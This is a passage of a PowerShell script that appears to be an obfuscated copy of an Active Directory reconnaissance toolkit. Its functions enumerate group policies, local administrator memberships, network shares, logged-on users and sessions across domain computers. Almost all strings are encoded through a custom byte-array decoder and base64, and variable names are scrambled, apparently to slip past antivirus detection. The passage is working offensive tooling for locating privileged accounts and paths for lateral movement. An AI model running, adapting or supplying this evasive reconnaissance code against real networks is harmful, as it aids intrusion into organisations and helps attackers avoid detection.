        if($UsePSDrive -and $Qh217c4) {
            Write-Verbose ((ParseEntry20 @(137,88,230,161,190,6,234,165,190,88,211,178,184,114,230,161,191,118,242,132,137,5,226,172,189,109,234,185,149,116,141,232) @(220,53,176,213)) + $Qh217c4)
            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}
function Get-NetGPO {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',
        [String]
        $DisplayName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $kwR5rt = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($kwR5rt) {
            if($DisplayName) {
                $kwR5rt.filter=((ParseEntry20 @(188,191,82,77,7,151,100,134,166,92,108,85,244,28,177,204,81,117,1,211,77,153,151,50,120,86,239,88,147,164,73,115,7,151,86,135,165,56,78,33,199,28,194,204,82,117,9,208,116,175,181,123,105,34,247,94,148,207,73,81,60,253,66,130,165,92,19,9,245,127,202,193) @(247,252,11,34,101,165,46)) + $DisplayName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
            }
            else {
                $kwR5rt.filter=((ParseEntry20 @(22,72,158,227,213,199,23,122,157,219,249,197,12,57,129,188,237,162,57,125,164,226,220,204,7,56,141,250,211,173,31,90,165,190,207,133,4,56,171,200,213,199,104,59,158,219,219,128,7,83,142,252,252,178,104,99,165,219,226,204) @(93,11,199,140,183,245)) + $GPOname + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
            }
            $kwR5rt.FindAll() | Where-Object {$_} | ForEach-Object {
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}
function Get-NetGPOGroup {
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',
        [String]
        $DisplayName,
        [Switch]
        $ResolveSids,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {
        $fDZZ = $Null
        $IdJ9 = $Null
        $GG4L2liq = $_.displayname
        $GPOname = $_.name
        $YIok8 = $_.gpcfilesyspath
        $XOlWSe =  @{
            'GptTmplPath' = ($YIok8 + (ParseEntry20 @(189,114,164,230,179,24,96,175,99,254,242,129,124,95,137,93,246,201,219,82,106,215,109,165,252,164,76,120,135,90,199,210,134,27,69,130,99,249,246,129,125,58,179,93,199,243,176,88,108,163,79,221,199,170,122,93,135,111,215,215,174,69,100,144,109,242,153,223) @(229,55,149,164,226,40,8)))
            'UsePSDrive' = $UsePSDrive
        }
        $ChJQ = Get-GptTmpl @XOlWSe
        if($ChJQ.GroupMembership) {
            $fDZZ = $ChJQ.GroupMembership | Get-Member *Memberof | ForEach-Object { $ChJQ.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            $IdJ9 = $ChJQ.GroupMembership | Get-Member *Members | ForEach-Object { $ChJQ.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
            if ($IdJ9 -or $fDZZ) {
                if(!$fDZZ) {
                    $fDZZ = 'S-1-5-32-544'
                }
                if($ResolveSids) {
                    $fDZZ = $fDZZ | ForEach-Object {Convert-SidToName $_}
                    $IdJ9 = $IdJ9 | ForEach-Object {Convert-SidToName $_}
                }
                if($fDZZ -isnot [system.array]) {$fDZZ = @($fDZZ)}
                if($IdJ9 -isnot [system.array]) {$IdJ9 = @($IdJ9)}
                $ByqH = @{
                    'GPODisplayName' = $GG4L2liq
                    'GPOName' = $GPOName
                    'GPOPath' = $YIok8
                    'Filters' = $Null
                    'MemberOf' = $fDZZ
                    'Members' = $IdJ9
                }
                New-Object -TypeName PSObject -Property $ByqH
            }
        }
        $XOlWSe =  @{
            'GroupsXMLpath' = ($YIok8 + (ParseEntry20 @(139,7,96,63,130,114,57,55,135,41,7,30,134,10,27,17,137,47,7,4,137,21,100,23,137,26,31,30,129,113,27,11,183,26,19,7,139,7,53,4,177,113,7,10,176,59,100,73,177,21,38,64) @(211,66,81,125)))
            'ResolveSids' = $ResolveSids
            'UsePSDrive' = $UsePSDrive
        }
        Get-GroupsXML @XOlWSe
    }
}
function Find-GPOLocation {
    [CmdletBinding()]
    Param (
        [String]
        $UserName,
        [String]
        $GroupName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($UserName) {
        $qzuM = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        $YniZ1ZYN = $qzuM.objectsid
        if(!$YniZ1ZYN) {    
            Throw ((ParseEntry20 @(115,203,1,192,128,69,100,253) @(37,147,79,172,227,44)) + $UserName + (ParseEntry20 @(140,237,190,10,225,247,205,198,156,249,197,78,225,169,205,201) @(198,148,252,127,131,196,156,161)))
        }
        $Tl2GKR4 = $YniZ1ZYN
        $XWK0 = $qzuM.samaccountname
        $riZxyR = $qzuM.distinguishedname
    }
    elseif($GroupName) {
        $tDwvKLfV = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
        $PfVgQi = $tDwvKLfV.objectsid
        if(!$PfVgQi) {    
            Throw ((ParseEntry20 @(14,153,103,129,56,242,108,144,22,221,16,202) @(92,170,45,247)) + $GroupName + (ParseEntry20 @(45,255,162,29,48,145,54,225,186,5,107,147,5,235,177,0) @(103,134,224,104,82,162)))
        }
        $Tl2GKR4 = $PfVgQi
        $XWK0 = $tDwvKLfV.samaccountname
        $riZxyR = $tDwvKLfV.distinguishedname
    }
    else {
        throw (ParseEntry20 @(55,87,54,253,147,114,218,52,88,55,182,165,99,215,66,120,41,196,248,98,243,22,56,81,228,140,31,248,25,86,53,224,171,114,198,1,101,35,197,160,112,195,57,123,3,192,159,64,241,44,91,16,221,158,123,248) @(123,1,96,135,201,42,144))
    }
    if($LocalGroup -like (ParseEntry20 @(26,44,172,84,209,114,72,41,26,32,215,2) @(81,71,234,63,179,37,36,92))) {
        $qbF4Ozdv = (ParseEntry20 @(218,23,59,151,211,236,218,26,70,149,214,204,193,58,90,223) @(143,110,11,239,159,184))
    }
    elseif ( ($LocalGroup -like (ParseEntry20 @(19,157,249,109,90,242,55,204) @(88,241,179,40,15,177))) -or ($LocalGroup -like (ParseEntry20 @(2,33,80,131,43,26,35,223,19,30,117,210) @(73,77,26,239))) ) {
        $qbF4Ozdv = (ParseEntry20 @(98,228,77,60,59,99,200,9,9,13,126,233,51,16,34,6) @(55,157,125,68,119))
    }
    elseif ($LocalGroup -like (ParseEntry20 @(251,29,244,208,224,170,251,21) @(174,100,196,168,172,254))) {
        $qbF4Ozdv = $LocalGroup
    }
    else {
        throw (ParseEntry20 @(58,92,103,67,178,233,43,191,13,118,103,24,136,253,17,131,10,67,16,25,162,249,25,155,39,88,58,107,177,249,98,135,12,118,50,83,143,246,25,159,10,92,103,80,136,199,48,132,39,88,58,122,185,248,18,153,34,88,28,95,136,215,17,159,39,88,58,125,167,234,22,131,32,72,111,112,161,199,17,199,11,67,28,69,162,246,29,135,52,88,106,20) @(110,27,94,41,235,190,83,247))
    }
    Write-Verbose ((ParseEntry20 @(4,144,187,56,145,202,40,131,227,5,153,171,25,150,191,111) @(80,215,130,82,200,157)) + $qbF4Ozdv)
    Write-Verbose ((ParseEntry20 @(247,68,44,49,251,49,60,120,244,49,6,35,238,106,43,117) @(161,3,106,72)) + $Tl2GKR4)
    Write-Verbose ((ParseEntry20 @(210,50,29,29,194,182,35,107,48,170,206,4,1,51,214,180,39,28,8,226,224,48,110,12,250,211,32,109,45,217,185,72) @(132,117,91,100,152)) + $riZxyR)
    if($Tl2GKR4 -isnot [system.array]) { $Tl2GKR4 = @($Tl2GKR4) }
    $Tl2GKR4 += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $XWK0 -RawSids
    if($Tl2GKR4 -isnot [system.array]) { $Tl2GKR4 = @($Tl2GKR4) }
    Write-Verbose ((ParseEntry20 @(183,171,245,65,191,171,225,28,132,164,245,64,172,180,253,68,134,145,203,64,129,191,237,86,132,171,253,86,170,149,238,17) @(229,252,175,44)) + $Tl2GKR4)
    $fSyz5FKV =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'PageSize' = $PageSize
    }
    $g3yS1O = Get-NetGPOGroup @fSyz5FKV | ForEach-Object {
        if ($_.members) {
            $_.members = $_.members | Where-Object {$_} | ForEach-Object {
                if($_ -match (ParseEntry20 @(30,194,201,195,36,31,238,196) @(75,187,249,187,104))) {
                    $_
                }
                else {
                    Convert-NameToSid -ObjectName $_ -Domain $Domain
                }
            }
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            if($_.members) {
                try {
                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $Tl2GKR4 -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $qbF4Ozdv) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug ((ParseEntry20 @(86,211,18,179,122,183,47,99,210,106,243,108,231,33,66,242,57,157,45,234,47,67,186,52,168,79,206,10,103,229,21,173,65,211,83,111,194,25,247,37) @(4,139,88,202,24,132,102)) + $Tl2GKR4 + (ParseEntry20 @(200,225,61,136) @(129,165,82,239,34,145)) + $_)
                }
            }
        }
    }
    Write-Verbose ((ParseEntry20 @(22,130,197,33,132,119,249,241,21,134,6,201,200,24,159,121) @(68,179,135,113,222)) + $g3yS1O)
    $aXa3Z9S = @{}
    $g3yS1O | Where-Object {$_} | ForEach-Object {
        $Jprc = $_.GPOName
        if( -not $aXa3Z9S[$Jprc] ) {
            $GPOname = $_.GPODisplayName
            $ihEQZ = $_.Filters
            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $Jprc -FullData -PageSize $PageSize | ForEach-Object {
                if($ihEQZ) {
                    $cm4bbpR = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
                        $_.adspath -match ($ihEQZ.Value)
                    } | ForEach-Object { $_.dnshostname }
                }
                else {
                    $cm4bbpR = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize
                }
                $CDz9rrV = New-Object PSObject
                $CDz9rrV | Add-Member Noteproperty 'ObjectName' $riZxyR
                $CDz9rrV | Add-Member Noteproperty 'GPOname' $GPOname
                $CDz9rrV | Add-Member Noteproperty 'GPOguid' $Jprc
                $CDz9rrV | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                $CDz9rrV | Add-Member Noteproperty 'Computers' $cm4bbpR
                $CDz9rrV
            }
            $aXa3Z9S[$Jprc] = $True
        }
    }
}
function Find-GPOComputerAdmin {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,
        [String]
        $OUName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $Recurse,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if(!$ComputerName -and !$OUName) {
            Throw (ParseEntry20 @(116,30,3,8,215,141,122,122,41,57,227,172,108,38,11,10,239,134,122,61,46,23,244,161,108,122,27,49,236,130,9,39,4,57,132,228,91,120,28,25,236,184,109,44,46,54,255,163,92,38,33,21,239,130,105,118) @(56,75,77,126,181,213))
        }
        if($ComputerName) {
            $PdWPht = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
            if(!$PdWPht) {
                throw ((ParseEntry20 @(255,52,206,105,63,222,112,158,92,175,84,59) @(174,6,247,29,92,150,38)) + $mnZ6k + (ParseEntry20 @(167,197,191,224,139,169,208,165,247,149,168,242,177,252,131,128) @(238,130,211,149,194)) + $Domain + (ParseEntry20 @(57,142,182,213,55,206,126,20,173,153,153,100,159,66,34,159) @(115,247,244,160,85,253,47)))
            }
            ForEach($mnZ6k in $PdWPht) {
                $u0q1Ya2 = $mnZ6k.distinguishedname
                $bHrY = $u0q1Ya2.split(",") | Foreach-Object {
                    if($_.startswith((ParseEntry20 @(195,121,31,221) @(151,72,74,228,115,73)))) {
                        $u0q1Ya2.substring($u0q1Ya2.indexof($_))
                    }
                }
            }
        }
        else {
            $bHrY = @($OUName)
        }
        Write-Verbose ((ParseEntry20 @(160,211,108,96,82,170,17,198,221,111,32,94,251,61,153,243) @(246,148,42,25,8,152,71)) + $bHrY)
        $bHrY | Where-Object {$_} | Foreach-Object {
            $BfAc2 = $_
            $g3yS1O = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
                $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | Foreach-Object {
                    if ($_.startswith((ParseEntry20 @(135,85,106,30,147,217,209,238) @(211,16,56,92,198,152,236)))) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                $fSyz5FKV =  @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $_
                    'UsePSDrive' = $UsePSDrive
                    'PageSize' = $PageSize
                }
                Get-NetGPOGroup @fSyz5FKV
            }
            $g3yS1O | Where-Object {$_} | Foreach-Object {
                $CR4Arm = $_
                $CR4Arm.members | Foreach-Object {
                    $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize
                    $WXYGsN = New-Object PSObject
                    $WXYGsN | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $WXYGsN | Add-Member Noteproperty 'OU' $BfAc2
                    $WXYGsN | Add-Member Noteproperty 'GPODisplayName' $CR4Arm.GPODisplayName
                    $WXYGsN | Add-Member Noteproperty 'GPOPath' $CR4Arm.GPOPath
                    $WXYGsN | Add-Member Noteproperty 'ObjectName' $Object.name
                    $WXYGsN | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $WXYGsN | Add-Member Noteproperty 'ObjectSID' $_
                    $WXYGsN | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
                    $WXYGsN 
                    if($Recurse -and $WXYGsN.isGroup) {
                        Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {
                            $EybC7 = $_.distinguishedName
                            $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(206,36,203,225) @(156,97,134,216,109,136)))) -replace 'DC=','' -replace ',','.'
                            if ($_.samAccountType -ne (ParseEntry20 @(4,212,50,130,42,20,68,121,221,9,234,83) @(75,144,115,179,103,110,5))) {
                                $uOt2b = $True
                            }
                            else {
                                $uOt2b = $False
                            }
                            if ($_.samAccountName) {
                                $s15G = $_.samAccountName
                            }
                            else {
                                try {
                                    $s15G = Convert-SidToName $_.cn
                                }
                                catch {
                                    $s15G = $_.cn
                                }
                            }
                            $WXYGsN = New-Object PSObject
                            $WXYGsN | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $WXYGsN | Add-Member Noteproperty 'OU' $BfAc2
                            $WXYGsN | Add-Member Noteproperty 'GPODisplayName' $CR4Arm.GPODisplayName
                            $WXYGsN | Add-Member Noteproperty 'GPOPath' $CR4Arm.GPOPath
                            $WXYGsN | Add-Member Noteproperty 'ObjectName' $s15G
                            $WXYGsN | Add-Member Noteproperty 'ObjectDN' $EybC7
                            $WXYGsN | Add-Member Noteproperty 'ObjectSID' $_.objectsid
                            $WXYGsN | Add-Member Noteproperty 'IsGroup' $uOt2b
                            $WXYGsN 
                        }
                    }
                }
            }
        }
    }
}
function Get-DomainPolicy {
    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet((ParseEntry20 @(107,2,154,93,5,115,233,173) @(57,69,163,41,92,36,133,216)),([char]0x44+[char]0x43))]
        $Source =(ParseEntry20 @(39,89,159,182,128,109,25,107) @(117,30,166,194,217,58)),
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveSids,
        [Switch]
        $UsePSDrive
    )
    if($Source -eq (ParseEntry20 @(11,151,123,220,0,135,46,221) @(89,208,66,168))) {
        $CR4Arm = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (ParseEntry20 @(239,140,19,36,196,190,228,118,199,140,15,43,217,128,239,73,196,157,15,40,216,128,232,116,199,159,110,105,219,144,248,118,198,162,31,43,196,174,239,1,216,157,23,105,218,144,252,118,197,174,110,97) @(138,246,94,92,149,212,174,49))
        if($CR4Arm) {
            $GptTmplPath = $CR4Arm.gpcfilesyspath + (ParseEntry20 @(189,181,88,130,180,168,215,251,177,155,63,163,177,207,211,219,134,157,80,186,135,170,229,129,189,182,13,176,135,245,237,199,129,195,36,167,177,244,237,210,176,194,63,170,183,207,237,193,129,182,17,136,134,208,237,228,135,168,43,179,169,245,211,196,191,151,84,253) @(229,240,105,192,229,152,191,177))
            $XOlWSe =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }
            Get-GptTmpl @XOlWSe
        }
    }
    elseif($Source -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) {
        $CR4Arm = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (ParseEntry20 @(57,50,12,74,185,27,30,111,7,18,82,172,45,15,29,48,24,99,177,21,22,8,14,19,69,129,81,110,18,12,0,79,164,53,26,43,25,44,73,216,51,48,21,125,25,76,186,38,20,4,120,107) @(92,72,86,8,232,97,91))
        if($CR4Arm) {
            $GptTmplPath = $CR4Arm.gpcfilesyspath + (ParseEntry20 @(162,223,107,57,97,10,146,208,14,16,102,89,174,205,54,17,83,87,195,224,56,73,106,10,162,220,62,11,82,87,168,236,62,72,125,93,174,246,8,24,101,8,172,240,8,44,98,74,158,220,34,51,83,114,168,207,56,35,114,73,182,247,54,14,106,93,199,167) @(250,154,90,123,48,58))
            $XOlWSe =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }
            Get-GptTmpl @XOlWSe | Foreach-Object {
                if($ResolveSids) {
                    $nh6CJgG = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq 'PrivilegeRights') {
                            $YmKO = New-Object PSObject
                            $_.Value.psobject.properties | Foreach-Object {
                                $nFK5t = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            Convert-SidToName $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { Convert-SidToName $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug ((ParseEntry20 @(111,24,213,1,4,240,204,108,94,45,201,2,4,241,253,57,92,23,170,22,47,133,203,65,111,3,222,78,47,130,184,54) @(61,64,159,120,102,195,133,11)) + $_)
                                    }
                                }
                                $YmKO | Add-Member Noteproperty $_.Name $nFK5t
                            }
                            $nh6CJgG | Add-Member Noteproperty 'PrivilegeRights' $YmKO
                        }
                        else {
                            $nh6CJgG | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $nh6CJgG
                }
                else { $_ }
            }
        }
    }
}
function Get-NetLocalGroup {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $GroupName = 'Administrators',
        [Switch]
        $ListGroups,
        [Switch]
        $Recurse
    )
    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {
            $d6fGzVeB = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
            $PUyH = $d6fGzVeB.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($PUyH.Value).Split('\')[1]
        }
    }
    process {
        $DvIb = @()
        if($ComputerFile) {
            $DvIb = Get-Content -Path $ComputerFile
        }
        else {
            $DvIb += Get-NameField -Object $ComputerName
        }
        ForEach($aXOOQM in $DvIb) {
            try {
                if($ListGroups) {
                    $mnZ6k = [ADSI]((ParseEntry20 @(87,194,117,53,81,116,52,4,77,137,33,125) @(1,240,25,64,5,24,101,50)) + $aXOOQM + (ParseEntry20 @(168,147,38,97,8,20,166,229,12,80,60,53) @(228,212,104,23,106,76)))
                    $mnZ6k.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                        $tDwvKLfV = New-Object PSObject
                        $tDwvKLfV | Add-Member Noteproperty 'Server' $aXOOQM
                        $tDwvKLfV | Add-Member Noteproperty 'Group' ($_.name[0])
                        $tDwvKLfV | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $tDwvKLfV | Add-Member Noteproperty 'Description' ($_.Description[0])
                        $tDwvKLfV
                    }
                }
                else {
                    $IdJ9 = @($([ADSI]((ParseEntry20 @(10,27,22,116,26,223,162,216,16,80,66,60) @(92,41,122,1,78,179,243,238)) + $aXOOQM + "/" + $GroupName)).psbase.Invoke('Members'))
                    $IdJ9 | ForEach-Object {
                        $c7DK4cS = New-Object PSObject
                        $c7DK4cS | Add-Member Noteproperty 'Server' $aXOOQM
                        $AdsPath = ($_.GetType().InvokeMember('Adspath', 'GetProperty', $Null, $_, $Null)).Replace('WinNT://', '')
                        $Name = Convert-NT4toCanonical -ObjectName $AdsPath
                        if($Name) {
                            $IqXysl = $Name.split("/")[0]
                            $NzV7aZ1l = $AdsPath.split("/")[-1]
                            $Name = ($IqXysl + "/" + $NzV7aZ1l)
                            $GzBotu = $True
                        }
                        else {
                            $Name = $AdsPath
                            $GzBotu = $False
                        }
                        $c7DK4cS | Add-Member Noteproperty 'AccountName' $Name
                        $c7DK4cS | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $Null, $_, $Null),0)).Value)
                        $c7DK4cS | Add-Member Noteproperty 'Disabled' $( if(-not $GzBotu) { try { $_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $Null, $_, $Null) } catch { 'ERROR' } } else { $False } )
                        $GOwA = ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                        $c7DK4cS | Add-Member Noteproperty 'IsGroup' $GOwA
                        $c7DK4cS | Add-Member Noteproperty 'IsDomain' $GzBotu
                        if($GOwA) {
                            $c7DK4cS | Add-Member Noteproperty 'LastLogin' ""
                        }
                        else {
                            try {
                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ( $_.GetType().InvokeMember('LastLogin', 'GetProperty', $Null, $_, $Null))
                            }
                            catch {
                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ""
                            }
                        }
                        $c7DK4cS
                        if($Recurse -and $GzBotu -and $GOwA) {
                            $IqXysl = $Name.split("/")[0]
                            $GroupName = $Name.split("/")[1].trim()
                            Get-NetGroupMember -GroupName $GroupName -Domain $IqXysl -FullData -Recurse | ForEach-Object {
                                $c7DK4cS = New-Object PSObject
                                $c7DK4cS | Add-Member Noteproperty 'Server' ($IqXysl + "/" + $($_.GroupName))
                                $EybC7 = $_.distinguishedName
                                $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(101,241,141,175) @(55,180,192,150,205,249,14,198)))) -replace 'DC=','' -replace ',','.'
                                if ($_.samAccountType -ne (ParseEntry20 @(109,162,38,97,59,192,99,212,42,42,47,142) @(34,230,103,80,118,186))) {
                                    $uOt2b = $True
                                }
                                else {
                                    $uOt2b = $False
                                }
                                if ($_.samAccountName) {
                                    $s15G = $_.samAccountName
                                }
                                else {
                                    try {
                                        try {
                                            $s15G = Convert-SidToName $_.cn
                                        }
                                        catch {
                                            $s15G = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug ((ParseEntry20 @(254,155,176,179,77,159,138,157,169,66,250,185,152,248,87,158,162,173,255,65,229,133,180,128,125,239,130,204,131,110,145,254) @(172,195,250,202,47)) + $_)
                                    }
                                }
                                $c7DK4cS | Add-Member Noteproperty 'AccountName' ($YLe0 + "/" + $s15G)
                                $c7DK4cS | Add-Member Noteproperty 'SID' $_.objectsid
                                $c7DK4cS | Add-Member Noteproperty 'Disabled' $False
                                $c7DK4cS | Add-Member Noteproperty 'IsGroup' $uOt2b
                                $c7DK4cS | Add-Member Noteproperty 'IsDomain' $True
                                $c7DK4cS | Add-Member Noteproperty 'LastLogin' ''
                                $c7DK4cS
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(125,98,42,74,193,232,227,83,120,1,23,241,226,220,107,38) @(42,27,108,46,136,173,181)) + $_)
            }
        }
    }
}
function Get-NetShare {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        $Nxku93 = 1
        $kAB9 = [IntPtr]::Zero
        $oPmA = 0
        $uE88OB = 0
        $xZFkyJ0 = 0
        $NW6jRjlY = $aJIaD::NetShareEnum($ComputerName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
        $Offset = $kAB9.ToInt64()
        Write-Debug ((ParseEntry20 @(143,146,209,66,145,245,178,30,185,230,201,29,132,248,205,30,148,232,205,30,190,147,209,1,185,228,232,21) @(221,160,135,114)) + $NW6jRjlY)
        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
            $dw2rvH = $uCBIau::GetSize()
            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
                $Lsy7 = $KMRG7si -as $uCBIau
                $Lsy7 | Select-Object *
                $Offset = $KMRG7si.ToInt64()
                $Offset += $dw2rvH
            }
            $Null = $aJIaD::NetApiBufferFree($kAB9)
        }
        else
        {
            switch ($NW6jRjlY) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}
function Get-NetLoggedon {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        $Nxku93 = 1
        $kAB9 = [IntPtr]::Zero
        $oPmA = 0
        $uE88OB = 0
        $xZFkyJ0 = 0
        $NW6jRjlY = $aJIaD::NetWkstaUserEnum($ComputerName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
        $Offset = $kAB9.ToInt64()
        Write-Debug ((ParseEntry20 @(224,107,13,116,6,187,135,53,63,1,50,152,232,107,63,40,16,169,139,44,18,12,0,130,209,106,13,55,46,170,221,62) @(178,89,91,68,74,238)) + $NW6jRjlY)
        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
            $dw2rvH = $lsABVkT::GetSize()
            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
                $Lsy7 = $KMRG7si -as $lsABVkT
                $Lsy7 | Select-Object *
                $Offset = $KMRG7si.ToInt64()
                $Offset += $dw2rvH
            }
            $Null = $aJIaD::NetApiBufferFree($kAB9)
        }
        else
        {
            switch ($NW6jRjlY) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}
function Get-NetSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [String]
        $UserName = ''
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        $Nxku93 = 10
        $kAB9 = [IntPtr]::Zero
        $oPmA = 0
        $uE88OB = 0
        $xZFkyJ0 = 0
        $NW6jRjlY = $aJIaD::NetSessionEnum($ComputerName, '', $UserName, $Nxku93, [ref]$kAB9, -1, [ref]$oPmA, [ref]$uE88OB, [ref]$xZFkyJ0)
        $Offset = $kAB9.ToInt64()
